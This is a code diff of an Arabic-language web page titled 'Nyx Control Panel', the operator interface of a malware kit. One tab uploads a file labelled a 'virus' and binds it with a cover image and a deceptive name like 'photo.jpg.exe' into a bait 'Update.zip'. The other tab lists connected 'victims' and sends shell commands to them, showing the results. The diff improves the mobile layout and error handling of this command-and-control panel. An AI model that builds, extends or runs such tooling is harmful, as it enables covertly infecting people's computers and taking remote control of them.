@@ -2,82 +2,146 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="ddosc2" content="width=device-width, initial-scale=1.0">
-<title>Nyx C2 & Binder</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Nyx Control Panel</title>
 <style>
-    body { background: #0a0a0a; color: #e8e8e8; font-family: monospace; padding: 20px; }
-    .card { background: #141414; border: 1px solid #222; padding: 15px; margin-bottom: 15px; border-radius: 8px; }
-    h2, h3 { color: #4ade80; margin-bottom: 10px; }
-    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-    th, td { padding: 8px; text-align: right; border-bottom: 1px solid #222; }
-    th { color: #666; }
-    .btn { background: #4a7dff; color: white; padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; margin-top: 5px; font-family: inherit;}
-    .btn-green { background: #4ade80; color: #000; font-weight: bold; }
-    input[type="text"], input[type="file"] { width: 100%; padding: 8px; background: #0a0a0a; color: white; border: 1px solid #333; border-radius: 4px; margin-bottom: 10px; box-sizing: border-box; font-family: inherit;}
-    pre { background: #000; padding: 10px; overflow-x: auto; color: #4ade80; max-height: 200px; white-space: pre-wrap;}
-    .nav { display: flex; gap: 10px; margin-bottom: 20px; }
-    .nav button { flex: 1; padding: 12px; font-size: 16px; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { 
+        background: #0a0a0a; color: #e8e8e8; 
+        font-family: -apple-system, system-ui, sans-serif; 
+        padding: 15px; font-size: 15px;
+    }
+    .card { 
+        background: #141414; border: 1px solid #222; 
+        padding: 15px; margin-bottom: 15px; border-radius: 12px; 
+    }
+    h2 { font-size: 20px; color: #4ade80; margin-bottom: 15px; text-align: center; }
+    h3 { font-size: 16px; color: #e8e8e8; margin-bottom: 10px; }
+    label { display: block; font-size: 12px; color: #888; margin-bottom: 5px; margin-top: 10px; }
+    
+    input[type="text"], input[type="file"] { 
+        width: 100%; padding: 12px; background: #0a0a0a; 
+        color: white; border: 1px solid #333; border-radius: 8px; 
+        margin-bottom: 10px; font-size: 14px; outline: none;
+    }
+    input[type="file"] { padding: 8px; }
+    
+    .btn { 
+        width: 100%; background: #4a7dff; color: white; padding: 14px; 
+        border: none; border-radius: 8px; cursor: pointer; 
+        font-size: 16px; font-weight: bold; margin-bottom: 10px;
+        transition: opacity 0.2s;
+    }
+    .btn:active { opacity: 0.7; }
+    .btn-green { background: #4ade80; color: #000; }
+    
+    .nav { display: flex; gap: 10px; margin-bottom: 15px; }
+    .nav .btn { margin-bottom: 0; background: #222; }
+    .nav .btn.active { background: #4a7dff; }
+    
     .hidden { display: none; }
-    label { color: #888; font-size: 12px; margin-top: 10px; display: block; }
+    
+    .table-wrap { overflow-x: auto; width: 100%; margin-top: 10px; border-radius: 8px; }
+    table { width: 100%; min-width: 400px; border-collapse: collapse; background: #0a0a0a; }
+    th, td { padding: 12px; text-align: right; border-bottom: 1px solid #222; font-size: 13px; }
+    th { color: #666; font-weight: normal; }
+    
+    pre { 
+        background: #000; padding: 12px; border-radius: 8px; 
+        color: #4ade80; font-size: 12px; white-space: pre-wrap; 
+        word-wrap: break-word; max-height: 250px; overflow-y: auto;
+        border: 1px solid #222;
+    }
+    
+    #download-link { margin-top: 10px; text-align: center; }
+    #download-link a { 
+        display: block; padding: 12px; background: #222; 
+        color: #4ade80; border-radius: 8px; text-decoration: none; 
+        font-weight: bold; border: 1px solid #4ade80;
+    }
 </style>
 </head>
 <body>
     <h2>Nyx Control Panel</h2>
     
     <div class="nav">
-        <button class="btn" onclick="showTab('binder')">صانع الملفات (Binder)</button>
-        <button class="btn" onclick="showTab('control')">التحكم بالضحايا (C2)</button>
+        <button class="btn active" id="nav-binder" onclick="showTab('binder')">صانع الملفات</button>
+        <button class="btn" id="nav-control" onclick="showTab('control')">الضحايا (C2)</button>
     </div>
 
+    <!-- Binder Tab -->
     <div id="binder-tab" class="card">
         <h3>1. ارفع الفايروس (أي ملف: exe, py, bat)</h3>
         <input type="file" id="payload-upload">
         <button class="btn" onclick="uploadPayload()">رفع الفايروس</button>
-        <span id="payload-status" style="color:#4ade80; margin-right:10px;"></span>
+        <span id="payload-status" style="color:#4ade80; font-size:13px; display:block; text-align:center;"></span>
         
         <hr style="border-color:#222; margin:20px 0;">
 
         <h3>2. اصنع الملف الخادع (Bait)</h3>
+        <label>ارفع الصورة (الغلاف):</label>
         <input type="file" id="img-upload" accept="image/*">
-        <label>اسم الفايروس اللي بيطلع للضحية (مثال: setup.exe أو photo.jpg):</label>
+        
+        <label>اسم الفايروس للضحية (مثال: photo.jpg.exe):</label>
         <input type="text" id="custom-name" placeholder="اتركه فاضي لياخذ اسم الصورة تلقائياً">
+        
         <button class="btn btn-green" onclick="buildPayload()">توليد الملف المضغوط (ZIP)</button>
-        <div id="download-link" style="margin-top:10px;"></div>
+        <div id="download-link"></div>
     </div>
 
+    <!-- C2 Tab -->
     <div id="control-tab" class="card hidden">
         <h3>الضحايا المتصلين</h3>
-        <table id="clients-table">
-            <thead><tr><th>ID</th><th>النظام</th><th>آخر اتصال</th><th>التحكم</th></tr></thead>
-            <tbody></tbody>
-        </table>
+        <div class="table-wrap">
+            <table id="clients-table">
+                <thead><tr><th>ID</th><th>النظام</th><th>آخر اتصال</th><th>التحكم</th></tr></thead>
+                <tbody></tbody>
+            </table>
+        </div>
         
         <div id="cmd-area" class="hidden" style="margin-top:20px; border-top: 1px solid #333; padding-top: 15px;">
-            <h3>التحكم في <span id="active-id" style="color:#fff;"></span></h3>
+            <h3>التحكم في <span id="active-id" style="color:#4ade80;"></span></h3>
             <input type="text" id="cmd-input" placeholder="اكتب أمر CMD (مثال: dir, whoami)">
             <button class="btn" onclick="sendCmd()">إرسال الأمر</button>
-            <h3>النتيجة:</h3>
+            
+            <h3 style="margin-top:15px;">النتيجة:</h3>
             <pre id="output">في انتظار النتيجة...</pre>
         </div>
     </div>
 
     <script>
         function showTab(tab) {
-            document.getElementById('binder-tab').style.display = tab === 'binder' ? 'block' : 'none';
-            document.getElementById('control-tab').style.display = tab === 'control' ? 'block' : 'none';
+            if (tab === 'binder') {
+                document.getElementById('binder-tab').classList.remove('hidden');
+                document.getElementById('control-tab').classList.add('hidden');
+                document.getElementById('nav-binder').classList.add('active');
+                document.getElementById('nav-control').classList.remove('active');
+            } else {
+                document.getElementById('binder-tab').classList.add('hidden');
+                document.getElementById('control-tab').classList.remove('hidden');
+                document.getElementById('nav-binder').classList.remove('active');
+                document.getElementById('nav-control').classList.add('active');
+            }
         }
 
+        // --- Binder Logic ---
         async function uploadPayload() {
             const fileInput = document.getElementById('payload-upload');
             if (!fileInput.files.length) return alert("اختر ملف أولاً");
             const formData = new FormData();
             formData.append("file", fileInput.files[0]);
             
-            document.getElementById('payload-status').innerText = "جاري الرفع...";
-            const res = await fetch('/upload_payload', { method: 'POST', body: formData });
-            const data = await res.json();
-            if (data.ok) document.getElementById('payload-status').innerText = "تم الرفع ✅";
-            else alert("فشل الرفع");
+            const statusEl = document.getElementById('payload-status');
+            statusEl.innerText = "جاري الرفع...";
+            
+            try {
+                const res = await fetch('/upload_payload', { method: 'POST', body: formData });
+                const data = await res.json();
+                if (data.ok) statusEl.innerText = "تم رفع الفايروس بنجاح ✅";
+                else alert("فشل الرفع");
+            } catch (e) {
+                statusEl.innerText = "خطأ في الاتصال";
+            }
         }
 
         async function buildPayload() {
@@ -88,57 +152,75 @@
             formData.append("custom_name", document.getElementById('custom-name').value);
             
             document.getElementById('download-link').innerHTML = "جاري التجهيز...";
-            const res = await fetch('/build', { method: 'POST', body: formData });
             
-            if (res.ok) {
-                const blob = await res.blob();
-                const url = window.URL.createObjectURL(blob);
-                document.getElementById('download-link').innerHTML = `<a href="${url}" download="Update.zip" style="color:#4ade80; font-weight:bold; font-size:18px; text-decoration:none;">⬇️ تحميل الملف المضغوط (Update.zip)</a>`;
-            } else {
-                alert("حدث خطأ، تأكد من رفع الفايروس أولاً");
-                document.getElementById('download-link').innerHTML = "";
+            try {
+                const res = await fetch('/build', { method: 'POST', body: formData });
+                
+                if (res.ok) {
+                    const blob = await res.blob();
+                    const url = window.URL.createObjectURL(blob);
+                    document.getElementById('download-link').innerHTML = `<a href="${url}" download="Update.zip">⬇️ تحميل الملف (Update.zip)</a>`;
+                } else {
+                    alert("حدث خطأ، تأكد من رفع الفايروس أولاً");
+                    document.getElementById('download-link').innerHTML = "";
+                }
+            } catch (e) {
+                alert("فشل الاتصال بالسيرفر");
             }
         }
 
+        // --- C2 Logic ---
         let activeId = null;
+        
         function loadClients() {
             fetch('/api/clients').then(r => r.json()).then(data => {
                 const tbody = document.querySelector('#clients-table tbody');
                 tbody.innerHTML = '';
+                if(Object.keys(data).length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; color:#666;">لا يوجد ضحايا متصلين حالياً</td></tr>';
+                    return;
+                }
                 for (const [id, info] of Object.entries(data)) {
                     const tr = document.createElement('tr');
-                    tr.innerHTML = `<td>${id.substring(0,8)}</td><td>${info.os}</td><td>${info.last_seen}</td>
-                    <td><button class="btn" onclick="selectClient('${id}')">تحكم</button></td>`;
+                    tr.innerHTML = `<td>${id.substring(0,6)}</td><td>${info.os}</td><td>${info.last_seen}</td>
+                    <td><button class="btn" style="padding:6px; margin:0; font-size:12px;" onclick="selectClient('${id}')">تحكم</button></td>`;
                     tbody.appendChild(tr);
                 }
-            });
+            }).catch(() => {});
         }
+        
         function selectClient(id) {
             activeId = id;
-            document.getElementById('active-id').innerText = id.substring(0,8);
+            document.getElementById('active-id').innerText = id.substring(0,6);
             document.getElementById('cmd-area').classList.remove('hidden');
             document.getElementById('output').innerText = 'في انتظار النتيجة...';
             getResult();
         }
+        
         function sendCmd() {
             const cmd = document.getElementById('cmd-input').value;
             if(!cmd || !activeId) return;
+            
             fetch('/api/send_cmd/' + activeId, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({cmd: cmd})
             }).then(() => {
                 document.getElementById('cmd-input').value = '';
-                document.getElementById('output').innerText = 'تم إرسال الأمر...';
+                document.getElementById('output').innerText = 'تم إرسال الأمر، بانتظار الرد...';
             });
         }
+        
         function getResult() {
             if(!activeId) return;
             fetch('/api/get_result/' + activeId).then(r => r.json()).then(data => {
-                if(data.result) document.getElementById('output').innerText = data.result;
-            });
+                if(data.result) {
+                    document.getElementById('output').innerText = data.result;
+                }
+            }).catch(() => {});
             setTimeout(getResult, 2000);
         }
+        
         setInterval(loadClients, 3000);
         loadClients();
     </script>
